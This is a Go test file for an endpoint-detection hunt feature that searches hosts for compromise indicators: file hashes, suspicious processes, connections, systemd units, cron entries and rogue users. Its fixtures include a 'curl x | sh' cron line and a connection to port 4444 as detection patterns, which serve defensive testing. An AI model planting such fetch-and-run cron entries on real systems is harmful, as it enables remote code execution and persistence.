package hunt

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"net/netip"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"xdr/internal/proc"
	"xdr/internal/testfs"
)

func hexOf(s string) string {
	h := sha256.Sum256([]byte(s))
	return hex.EncodeToString(h[:])
}

const implant = "implant body"

func req(ioc IOC) *Request { return &Request{ID: ID(ioc), From: "web01", IOC: ioc} }

func kinds(r Result) string {
	var out []string
	for _, h := range r.Hits {
		out = append(out, h.Kind+":"+h.What)
	}
	return strings.Join(out, ",")
}

var nosnap = &proc.Snapshot{Procs: map[int]*proc.Proc{}}

func TestSearch_Files(t *testing.T) {
	root := testfs.Root(t)
	testfs.File(t, root, "/var/tmp/.cache-helper", implant, 0o755)
	testfs.File(t, root, "/opt/same-size", strings.Repeat("z", len(implant)), 0o644)
	testfs.File(t, root, "/opt/locked", "different size, never opened", 0)
	ioc := IOC{Files: []File{{SHA256: hexOf(implant), Size: int64(len(implant)), Path: "/tmp/.x"}}}
	r := Search(context.Background(), root, req(ioc), nosnap, nil, DefaultBudget)
	if kinds(r) != "file:/var/tmp/.cache-helper" || r.Hits[0].SHA256 != hexOf(implant) || r.Partial != "" || r.Unreadable != 0 {
		t.Fatalf("%+v", r)
	}
}

func TestSearch_Paths(t *testing.T) {
	root := testfs.Root(t)
	testfs.File(t, root, "/tmp/.x", "a variant", 0o755)
	ioc := IOC{Files: []File{{SHA256: hexOf(implant), Size: int64(len(implant)), Path: "/tmp/.x"}}}
	r := Search(context.Background(), root, req(ioc), nosnap, nil, DefaultBudget)
	if kinds(r) != "path:/tmp/.x" || r.Hits[0].SHA256 != hexOf("a variant") {
		t.Fatalf("%+v", r)
	}
	testfs.File(t, root, "/tmp/.x", implant, 0o755)
	if r := Search(context.Background(), root, req(ioc), nosnap, nil, DefaultBudget); kinds(r) != "file:/tmp/.x" {
		t.Fatalf("%+v", r)
	}
}

func TestSearch_Processes(t *testing.T) {
	ns := "net:[1]"
	s := &proc.Snapshot{
		Procs: map[int]*proc.Proc{
			10: {PID: 10, Exe: "/dev/shm/x", NetNS: ns, FDs: map[int]uint64{}},
			11: {PID: 11, Exe: "/usr/bin/curl", NetNS: ns, FDs: map[int]uint64{3: 500}},
		},
		Socks: map[string]map[uint64]proc.Sock{ns: {500: {Inode: 500, Proto: "tcp",
			Local: netip.MustParseAddrPort("192.0.2.5:40000"), Remote: netip.MustParseAddrPort("203.0.113.9:4444")}}},
	}
	hash := func(p *proc.Proc) string { return hexOf(p.Exe) }
	ioc := IOC{Files: []File{{SHA256: hexOf("/dev/shm/x"), Size: 99}}, Remotes: []Remote{{netip.MustParseAddr("203.0.113.9"), 4444, "tcp"}}}
	r := Search(context.Background(), testfs.Root(t), req(ioc), s, hash, DefaultBudget)
	if kinds(r) != "process:/dev/shm/x,connection:203.0.113.9:4444/tcp" || r.Hits[0].PID != 10 || r.Hits[1].PID != 11 {
		t.Fatalf("%+v", r)
	}
}

func TestSearch_UnitsCronUsers(t *testing.T) {
	root := testfs.Root(t)
	unit := "[Service]\nExecStart=/tmp/x\n"
	testfs.File(t, root, "/etc/systemd/system/evil.service", unit, 0o644)
	testfs.File(t, root, "/etc/cron.d/x", "* * * * * root curl x | sh\n", 0o644)
	testfs.File(t, root, "/etc/passwd", "root:x:0:0::/root:/bin/bash\nsvc-backup:x:1500:1500::/:/bin/sh\n", 0o644)
	ioc := IOC{Units: []string{"evil.service@" + hexOf(unit), "other.service@" + hexOf(unit)}, Cron: []string{"curl x | sh"}, Users: []string{"svc-backup", "nobody2"}}
	r := Search(context.Background(), root, req(ioc), nosnap, nil, DefaultBudget)
	if kinds(r) != "unit:evil.service,cron:curl x | sh,user:svc-backup" || r.Hits[1].Path != "/etc/cron.d/x" {
		t.Fatalf("%+v", r)
	}
}

func TestSearch_Budget(t *testing.T) {
	root := testfs.Root(t)
	for i := range 50 {
		testfs.File(t, root, fmt.Sprintf("/d/f%02d", i), "x", 0o644)
	}
	ioc := IOC{Files: []File{{SHA256: hexOf(implant), Size: int64(len(implant))}}}
	b := DefaultBudget
	b.Files = 10
	if r := Search(context.Background(), root, req(ioc), nosnap, nil, b); !strings.Contains(r.Partial, "file budget") {
		t.Fatalf("%+v", r)
	}
	b = DefaultBudget
	b.Hashed = 4
	testfs.File(t, root, "/e/same", strings.Repeat("y", len(implant)), 0o644)
	if r := Search(context.Background(), root, req(ioc), nosnap, nil, b); !strings.Contains(r.Partial, "hash budget") {
		t.Fatalf("%+v", r)
	}
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if r := Search(ctx, root, req(ioc), nosnap, nil, DefaultBudget); r.Partial == "" {
		t.Fatalf("cancelled: %+v", r)
	}
}

func TestSearch_SkipsKernelAndContainers(t *testing.T) {
	root := testfs.Root(t)
	for _, p := range []string{"/proc/1/x", "/sys/x", "/var/lib/docker/overlay2/x", "/var/lib/containerd/x"} {
		testfs.File(t, root, p, implant, 0o644)
	}
	testfs.File(t, root, "/srv/x", implant, 0o644)
	ioc := IOC{Files: []File{{SHA256: hexOf(implant), Size: int64(len(implant))}}}
	if r := Search(context.Background(), root, req(ioc), nosnap, nil, DefaultBudget); kinds(r) != "file:/srv/x" {
		t.Fatalf("%+v", r)
	}
	_ = os.Remove(filepath.Join(root, "/srv/x"))
}

// Network and FUSE mounts are not walked: one hung server would hang
// every later hunt.
func TestSearch_SkipsRemoteMounts(t *testing.T) {
	root := testfs.Root(t)
	testfs.File(t, root, "/mnt/share/x", implant, 0o644)
	testfs.File(t, root, "/mnt/fuse/x", implant, 0o644)
	testfs.File(t, root, "/srv/x", implant, 0o644)
	mi := filepath.Join(t.TempDir(), "mountinfo")
	table := fmt.Sprintf("22 1 8:1 / / rw - ext4 /dev/sda1 rw\n"+
		"40 22 0:50 / %s rw,relatime - nfs4 192.0.2.7:/export rw\n"+
		"41 22 0:51 / %s rw - fuse.sshfs u@192.0.2.8: rw\n",
		filepath.Join(root, "mnt/share"), strings.ReplaceAll(filepath.Join(root, "mnt/fuse"), " ", `\040`))
	if err := os.WriteFile(mi, []byte(table), 0o644); err != nil {
		t.Fatal(err)
	}
	defer SetMountinfo(mi)()
	ioc := IOC{Files: []File{{SHA256: hexOf(implant), Size: int64(len(implant)), Path: "/mnt/share/x"}}}
	if r := Search(context.Background(), root, req(ioc), nosnap, nil, DefaultBudget); kinds(r) != "file:/srv/x" {
		t.Fatalf("%+v", r)
	}
}

// A slow or huge file stops at the time budget, not after the whole read.
func TestSearch_HashStopsAtDeadline(t *testing.T) {
	root := testfs.Root(t)
	const size = 4 << 30
	f, err := os.Create(filepath.Join(root, "big"))
	if err != nil {
		t.Fatal(err)
	}
	if err := f.Truncate(size); err != nil {
		t.Skip("no sparse files:", err)
	}
	f.Close()
	ioc := IOC{Files: []File{{SHA256: hexOf(implant), Size: size}}}
	b := DefaultBudget
	b.Hashed, b.Time = 8<<30, 200*time.Millisecond
	start := time.Now()
	r := Search(context.Background(), root, req(ioc), nosnap, nil, b)
	if took := time.Since(start); took > 1500*time.Millisecond || r.Partial != "time budget" {
		t.Fatalf("took %v: %+v", took, r)
	}
}
